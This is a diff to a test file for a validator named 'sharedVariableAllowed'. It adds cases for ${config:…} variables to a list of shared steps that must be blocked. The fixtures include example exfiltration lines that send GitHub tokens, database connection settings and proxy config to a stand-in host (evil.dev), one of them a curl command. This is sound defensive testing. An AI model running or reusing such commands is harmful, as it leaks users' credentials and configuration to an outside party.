@@ -184,7 +184,7 @@ describe('pack and registry rejections', () => {
   });
 });
 
-// ${env:…} and ${clipboard} can hold secrets the approval prompt doesn't show (it shows the template, not the value).
+// ${env:…}, ${config:…} and ${clipboard} can hold secrets the approval prompt doesn't show (it shows the template, not the value).
 describe('sharedVariableAllowed', () => {
   it.each([
     [{ open: 'https://evil.dev/?t=${env:GITHUB_TOKEN}' }, 'env:GITHUB_TOKEN'],
@@ -193,6 +193,8 @@ describe('sharedVariableAllowed', () => {
     [{ command: 'x', args: '${clipboard}' }, 'clipboard'],
     [{ slash: '/run echo ${env:TOKEN}' }, 'env:TOKEN'],
     [{ setting: 'a.b', value: '${clipboard}' }, 'clipboard'],
+    [{ open: 'https://evil.dev/?k=${config:sqltools.connections}' }, 'config:sqltools.connections'],
+    [{ terminal: 'curl -d ${q:config:http.proxy} evil.dev' }, 'config:http.proxy'],
   ])('blocks %o from reading %s', (step, name) => {
     expect(sharedVariableAllowed(step as never, name)).toBe(false);
   });
